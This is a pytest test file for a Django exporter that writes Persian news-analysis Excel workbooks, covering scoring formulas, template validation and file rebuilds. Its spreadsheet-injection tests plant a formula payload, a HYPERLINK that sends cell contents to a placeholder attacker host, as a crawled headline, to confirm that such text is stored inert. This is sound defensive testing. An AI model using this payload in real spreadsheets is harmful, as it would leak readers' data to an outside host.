"""The analyst workbook.

The tests that matter here are the ones about the template's own quirks. A workbook with
the wrong dropdown values or a missing extLst block still OPENS - which is precisely why
those failures went unnoticed in the legacy exporter for 40 files.
"""

from __future__ import annotations

import itertools
import zipfile
from datetime import timedelta

import pytest
from django.utils import timezone
from openpyxl import load_workbook

from articles.models import Article, EventAssessment, EventWatchItem, NewsEvent, WatchItem
from core.scoring import HIGH_COUNT_REQUIRED, decide
from core.vocabulary import GOLD_TRENDS, LEVELS, NotifyStatus
from exports import workbook

pytestmark = pytest.mark.django_db


# ------------------------------------------------------------- a tiny formula evaluator
#
# `_formula` generates exactly three constructs - IF, AND and COUNTIF over one row - so
# this evaluates OUR grammar rather than pretending to be Excel. It exists because the
# module claims the workbook "cannot drift into voting differently from decide()", and the
# only test that can hold that claim up is one that runs both and compares the answers.


def _split_args(text: str) -> list[str]:
    args, depth, quoted, current = [], 0, False, ""
    for character in text:
        if character == '"':
            quoted = not quoted
        elif not quoted and character == "(":
            depth += 1
        elif not quoted and character == ")":
            depth -= 1
        elif not quoted and character == "," and depth == 0:
            args.append(current)
            current = ""
            continue
        current += character
    return [*args, current]


def _evaluate(expression: str, cells: list[str]):
    """Loosest binding first: calls, then comparison, then addition, then a bare COUNTIF.

    The order is the whole subtlety. A sum of COUNTIFs also starts with `COUNTIF(` and ends
    with `)`, so a naive check reads the entire sum as one call; and a comparison has to be
    split before addition or `a+b>=2` partitions into `a` and `b>=2`.
    """
    expression = expression.strip()
    if expression.startswith('"') and expression.endswith('"'):
        return expression[1:-1]
    if expression.isdigit():
        return int(expression)
    if expression.startswith("IF(") and expression.endswith(")"):
        condition, yes, no = _split_args(expression[3:-1])
        return _evaluate(yes if _evaluate(condition, cells) else no, cells)
    if expression.startswith("AND(") and expression.endswith(")"):
        return all(_evaluate(part, cells) for part in _split_args(expression[4:-1]))
    # `>=` before `=`, or the `=` inside `>=` matches first. Every comparison left at this
    # point is top level: IF and AND are already unwrapped, and no COUNTIF argument
    # contains one of these characters.
    for symbol, compare in ((">=", lambda a, b: a >= b), ("<", lambda a, b: a < b),
                            ("=", lambda a, b: a == b)):
        left, separator, right = expression.partition(symbol)
        if separator:
            return compare(_evaluate(left, cells), _evaluate(right, cells))
    if "+" in expression:
        return sum(_evaluate(part, cells) for part in expression.split("+"))
    _, literal = _split_args(expression[len("COUNTIF(") : -1])
    return cells.count(literal.strip().strip('"'))


def notify_by_formula(scores) -> str:
    """What Excel would show in the notify column for one row of scores."""
    return _evaluate(workbook._formula(3).lstrip("="), [score or "" for score in scores])


@pytest.fixture
def analysed(make_article):
    """A news event with a Jev assessment, as the workbook now reads them.

    Defaults notify: «زیاد» occurrence (several source groups), «زیاد» gold (75) and
    «خیلی زیاد» security (Iran score 80, security topic).
    """

    def _make(category="conflict_security", evidence="multi", gold=75, iran=80,
              brief="خلاصه رویداد", title="تیتر رویداد", when=None):
        when = when or timezone.now()
        article = make_article(published_at=when)
        event = NewsEvent.objects.create(
            primary_article=article, event_time=when, first_seen_at=when, category=category,
            evidence_level=evidence, iran_score=iran, global_score=iran, title_fa=title,
            brief_fa=brief,
        )
        event.articles.add(article)
        EventAssessment.objects.create(
            event=event, model="jev", evidence_hash="h", category=category,
            iran_score=iran or 0, global_score=iran or 0,
            asset_scores={} if gold is None else {"gold": gold}, confidence=0.9,
        )
        return event

    return _make


def _age(event, days, *, touched_days=None):
    moment = timezone.now() - timedelta(days=days)
    touched = timezone.now() - timedelta(days=days if touched_days is None else touched_days)
    # queryset.update() leaves auto_now alone, so updated_at is set explicitly.
    NewsEvent.objects.filter(pk=event.pk).update(event_time=moment, updated_at=touched)


class TestRows:
    def test_uses_the_events_persian_title(self, analysed):
        analysed()
        assert workbook.rows()[0]["تیتر خبر"] == "تیتر رویداد"

    def test_falls_back_to_the_original_title(self, analysed):
        event = analysed(title="")
        assert workbook.rows()[0]["تیتر خبر"] == event.primary_article.original_title

    def test_scores_map_onto_the_teams_levels(self, analysed):
        analysed(evidence="official", gold=50, iran=100)
        record = workbook.rows()[0]
        assert record["اطمینان از وقوع خبر"] == "خیلی زیاد"
        assert record["چقدر بر تغییر قیمت طلا اثر دارد؟"] == "متوسط"
        assert record["چقدربا امنیت مرتبط است ؟"] == "خیلی زیاد"

    def test_an_unassessed_axis_is_blank_not_a_level(self, analysed):
        """The workbook has to show 'nobody judged this', and a blank cell is how the
        team's file expresses it. Writing a level would be the sentinel bug in Excel."""
        analysed(gold=None)
        assert workbook.rows()[0]["چقدر بر تغییر قیمت طلا اثر دارد؟"] == ""

    def test_security_is_blank_outside_security_topics(self, analysed):
        analysed(category="macro_monetary")
        record = workbook.rows()[0]
        assert record["چقدربا امنیت مرتبط است ؟"] == ""
        assert record["_category"] == "economics"

    def test_gold_trend_is_blank_because_no_direction_was_predicted(self, analysed):
        analysed()
        assert workbook.rows()[0]["جهت طلا"] == ""

    def test_notify_status_matches_the_scoring_rule(self, analysed):
        analysed()
        assert workbook.rows()[0][workbook.NOTIFY_HEADER] == NotifyStatus.NOTIFY

    def test_withdrawn_events_are_excluded(self, analysed):
        analysed()
        NewsEvent.objects.update(status=NewsEvent.Status.WITHDRAWN)
        assert workbook.rows() == []

    def test_sources_brief_and_watch_items(self, analysed, make_article):
        event = analysed()
        other = make_article(original_outlet="ایسنا")
        event.articles.add(other)
        item = WatchItem.objects.create(
            slug="gold_18k", kind="asset", name_fa="طلای ۱۸ عیار", name_en="18k gold"
        )
        EventWatchItem.objects.create(event=event, item=item)
        record = workbook.rows()[0]
        assert "ایسنا" in record["منبع"] and "، " in record["منبع"]
        assert record["توضیحات"] == "خلاصه رویداد\nپایش: طلای ۱۸ عیار"

    def test_cells_only_carry_the_teams_vocabulary(self, analysed):
        """Every score cell is a level from core.vocabulary or blank; the trend cell is a
        gold trend or blank. Anything else is a value the workbook's dropdown rejects."""
        for evidence in ("single", "multi", "official", "disputed"):
            for category in ("conflict_security", "energy_commodities", "disasters"):
                analysed(evidence=evidence, category=category, gold=None, iran=0)
                analysed(evidence=evidence, category=category, gold=100, iran=100)
        for record in workbook.rows():
            for header in workbook.HEADERS[5:8]:
                assert record[header] in ("", *LEVELS), (header, record[header])
            assert record["جهت طلا"] in ("", *GOLD_TRENDS)
            assert record[workbook.NOTIFY_HEADER] in NotifyStatus.values

    def test_persian_dates_use_the_teams_format(self):
        assert workbook.persian_date("1405-06-11") == "11 شهریور 1405"

    def test_filename_matches_the_teams_convention(self):
        """An ISO date would land the same content under names nobody recognises."""
        assert workbook.workbook_filename("1405-06-11") == "ثبت و تحلیل خبر - 11 شهریور 1405.xlsx"


class TestFormula:
    def test_formula_is_generated_from_the_scoring_thresholds(self):
        """The workbook must not be able to vote differently from decide(). Both read the
        same constants, so a retune moves them together."""
        formula = workbook._formula(3)
        assert f">={HIGH_COUNT_REQUIRED}" in formula
        assert NotifyStatus.NOTIFY in formula and NotifyStatus.NO_NOTIFY in formula
        # The two strongest levels count as "high"; the weakest is the floor violation.
        assert LEVELS[3] in formula and LEVELS[4] in formula
        assert LEVELS[0] in formula

    def test_the_formula_agrees_with_decide_on_every_combination(self):
        """The claim the module makes, held up rather than asserted.

        The formula could only say notify or do-not-notify, so a row where the model
        assessed fewer than two axes - every score cell blank - evaluated to «اطلاع‌رسانی
        نشود» while `decide()` returned «ارزیابی ناکافی». The two artifacts built by the
        same function disagreed, and the one the analyst reads was the one that collapsed
        "not assessed" into "not notable" - the exact substitution this system exists to
        prevent.
        """
        for scores in itertools.product((None, *LEVELS), repeat=3):
            assert notify_by_formula(scores) == decide(*scores).status, scores

    def test_an_unassessed_row_reads_as_insufficient_not_as_quiet(self):
        assert notify_by_formula((None, None, None)) == NotifyStatus.INSUFFICIENT
        assert notify_by_formula((LEVELS[4], None, None)) == NotifyStatus.INSUFFICIENT


class TestBuiltFile:
    @pytest.fixture
    def built(self, analysed, tmp_path):
        analysed()
        return workbook.build_workbook(workbook.rows(), tmp_path / "out.xlsx")

    def test_only_the_analyst_sheet_survives(self, built):
        """The template has four sheets; all 40 workbooks the team produced carry one."""
        assert load_workbook(built).sheetnames == [workbook.SHEET]

    def test_the_link_column_header_is_restored(self, built):
        """The template's own header row is missing this cell, so every legacy workbook
        had an unlabelled final column."""
        sheet = load_workbook(built)[workbook.SHEET]
        assert sheet.cell(2, len(workbook.HEADERS)).value == "لینک"

    def test_extension_block_survives_the_save(self, built):
        """openpyxl drops <extLst> silently. Without it the file still OPENS - with the
        analyst's conditional formatting and validation extensions gone."""
        with zipfile.ZipFile(built) as archive:
            xml = archive.read("xl/worksheets/sheet1.xml")
        assert b"<extLst" in xml and b"</extLst>" in xml

    def test_dropdowns_offer_the_pipelines_own_vocabulary(self, built):
        """The template ships two stale validations: a yes/no list on the score columns
        from row 304 down, and a gold-trend list that stops at row 303."""
        sheet = load_workbook(built)[workbook.SHEET]
        formulas = [v.formula1 for v in sheet.data_validations.dataValidation]
        assert any(all(level in f for level in LEVELS) for f in formulas)
        assert any(all(trend in f for trend in GOLD_TRENDS) for f in formulas)

    def test_dropdowns_cover_the_whole_styled_range(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        spans = " ".join(str(v.sqref) for v in sheet.data_validations.dataValidation)
        assert str(workbook.MAX_STYLED_ROW) in spans

    def test_notify_cell_holds_a_formula_not_a_value(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        column = workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
        assert str(sheet.cell(workbook.FIRST_DATA_ROW, column).value).startswith("=IF(")

    def test_the_link_is_a_real_hyperlink(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        cell = sheet.cell(workbook.FIRST_DATA_ROW, len(workbook.HEADERS))
        assert cell.hyperlink is not None


class TestExportAll:
    def test_other_events_stay_out_of_the_workbook(self, analysed, tmp_path):
        """`other` events are stored and visible in the app, but the workbook is a
        security/economics instrument and the team's files never carried them."""
        analysed(category="other")
        files = workbook.export_all(tmp_path)
        assert not [key for key in files if key.startswith("excel:")]

    def test_one_workbook_per_jalali_day(self, analysed, tmp_path):
        analysed()
        analysed()
        files = workbook.export_all(tmp_path)
        assert len([key for key in files if key.startswith("excel:")]) == 1

    def test_writes_the_notify_feed_and_a_file_per_category(self, analysed, tmp_path):
        analysed()
        files = workbook.export_all(tmp_path)
        assert files["important"].exists()
        assert files["text:security"].exists()
        assert files["text:security/economics"].exists()

    def test_notify_feed_contains_only_notifying_events(self, analysed, tmp_path):
        analysed(evidence="disputed", gold=25, iran=30)
        files = workbook.export_all(tmp_path)
        assert files["important"].read_text(encoding="utf-8").strip() == ""


class TestRowNumbering:
    """`شناسه خبر` is a position within the file, not a corpus-wide sequence.

    Checked against the team's own output: all 40 workbooks number their rows 1..N.
    """

    def test_each_workbook_numbers_its_own_rows_from_one(self, analysed, tmp_path):
        for _ in range(2):
            analysed()
        _age(analysed(), 1)

        files = workbook.export_all(tmp_path)
        paths = [path for key, path in files.items() if key.startswith("excel:")]
        assert len(paths) == 2, "the fixture must produce two distinct Jalali days"

        for path in paths:
            sheet = load_workbook(path)[workbook.SHEET]
            ids = [
                sheet.cell(row, 1).value
                for row in range(workbook.FIRST_DATA_ROW, sheet.max_row + 1)
            ]
            ids = [value for value in ids if value not in (None, "")]
            assert ids == list(range(1, len(ids) + 1)), (
                f"{path.name} is numbered {ids}, not 1..N"
            )

    def test_numbering_is_a_property_of_the_file_not_of_the_records(self, analysed, tmp_path):
        for _ in range(3):
            analysed()
        target = workbook.build_workbook(workbook.rows()[1:], tmp_path / "slice.xlsx")

        sheet = load_workbook(target)[workbook.SHEET]
        assert sheet.cell(workbook.FIRST_DATA_ROW, 1).value == 1


class TestRebuildIsBounded:
    """The nightly task rebuilds only the days whose events changed inside the rolling
    window, and the export volume keeps a bounded number of files (storage policy)."""

    @pytest.fixture(autouse=True)
    def _settings(self, settings, tmp_path):
        settings.NEWS_ROLLING_WINDOW_DAYS = 14
        settings.EXPORT_KEEP_DAYS = 60
        settings.EXPORT_DIR = tmp_path

    def test_a_day_nobody_touched_is_not_rebuilt(self, analysed):
        _age(analysed(), 30)
        analysed()

        from exports.tasks import build_daily_workbook

        result = build_daily_workbook()
        assert result["workbooks"] == 1, "only the recent day should have been rebuilt"

    def test_a_late_assessment_brings_its_day_back(self, analysed):
        """Keyed on the event's last change, not its time: a re-assessed old event
        belongs in that old day's file."""
        _age(analysed(), 30, touched_days=0)

        from exports.tasks import build_daily_workbook

        assert build_daily_workbook()["workbooks"] == 1

    def test_rebuild_all_is_the_escape_for_a_fresh_deployment(self, analysed):
        _age(analysed(), 30)
        analysed()

        from exports.tasks import build_daily_workbook

        assert build_daily_workbook(rebuild_all=True)["workbooks"] == 2

    def test_events_older_than_the_kept_span_are_left_out(self, analysed, tmp_path):
        _age(analysed(title="رویداد قدیمی"), 90, touched_days=0)

        from exports.tasks import build_daily_workbook

        assert build_daily_workbook(rebuild_all=True)["workbooks"] == 0
        feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
        assert "رویداد قدیمی" not in feed

    def test_the_text_feeds_cover_the_kept_span(self, analysed, tmp_path):
        _age(analysed(), 30)

        from exports.tasks import build_daily_workbook

        build_daily_workbook()
        feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
        assert "تیتر رویداد" in feed

    def test_only_the_newest_workbooks_are_kept(self, tmp_path):
        import os

        folder = tmp_path / "Excel Files"
        folder.mkdir()
        for index in range(5):
            path = folder / f"{index}.xlsx"
            path.write_bytes(b"x")
            os.utime(path, (index, index))
        removed = workbook.prune_workbooks(folder, 3)
        assert sorted(path.name for path in removed) == ["0.xlsx", "1.xlsx"]
        assert sorted(path.name for path in folder.iterdir()) == ["2.xlsx", "3.xlsx", "4.xlsx"]


class TestSpreadsheetInjection:
    """A crawled headline must not become a live formula.

    openpyxl types any string starting with `=` as a FORMULA, so the payload is inert
    everywhere in this system except in the one artifact a human opens. Titles and outlet
    names come verbatim from third-party markup.
    """

    def _sheet(self, tmp_path, name):
        target = workbook.build_workbook(workbook.rows(), tmp_path / name)
        return load_workbook(target)[workbook.SHEET]

    def test_a_headline_that_looks_like_a_formula_is_stored_as_text(
        self, analysed, tmp_path
    ):
        payload = '=HYPERLINK("http://evil.test/?x="&A2,"مشاهده خبر")'
        event = analysed(title="")
        Article.objects.filter(pk=event.primary_article_id).update(original_title=payload)

        sheet = self._sheet(tmp_path, "title.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("تیتر خبر") + 1)
        assert cell.data_type == "s", "a crawled title must never be typed as a formula"
        assert cell.value == payload, "and the text itself must survive unchanged"

    def test_an_outlet_name_is_stored_as_text_too(self, analysed, tmp_path):
        """Every value column, not just the title - the outlet is equally third-party."""
        event = analysed()
        Article.objects.filter(pk=event.primary_article_id).update(original_outlet="=1+1")

        sheet = self._sheet(tmp_path, "outlet.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("منبع") + 1)
        assert cell.data_type == "s"

    def test_the_notify_column_is_still_a_real_formula(self, analysed, tmp_path):
        """The guard must not disarm the one formula that is supposed to be there - it is
        what keeps the sheet from voting differently from `decide()`."""
        analysed()
        sheet = self._sheet(tmp_path, "notify.xlsx")
        cell = sheet.cell(
            workbook.FIRST_DATA_ROW, workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
        )
        assert cell.data_type == "f"
